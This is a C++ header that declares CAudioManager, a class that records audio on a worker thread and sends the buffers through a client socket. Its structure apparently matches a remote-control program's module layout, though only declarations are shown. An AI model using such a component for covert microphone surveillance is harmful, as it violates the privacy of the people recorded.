// AudioManager.h: interface for the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_AUDIOMANAGER_H__8EB9310D_AEFB_40C5_A4E7_6EE4603CBC69__INCLUDED_)
#define AFX_AUDIOMANAGER_H__8EB9310D_AEFB_40C5_A4E7_6EE4603CBC69__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "Audio.h"
class CAudioManager : public CManager  
{
public:
	CAudioManager(CClientSocket *pClient);
	virtual ~CAudioManager();
	int	sendRecordBuffer();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

	static bool m_bIsWorking;
private:
	bool Initialize();

	CAudio	*m_lpAudio;
	HANDLE	m_hWorkThread;
	static DWORD WINAPI WorkThread(LPVOID lparam);
};

#endif // !defined(AFX_AUDIOMANAGER_H__8EB9310D_AEFB_40C5_A4E7_6EE4603CBC69__INCLUDED_)
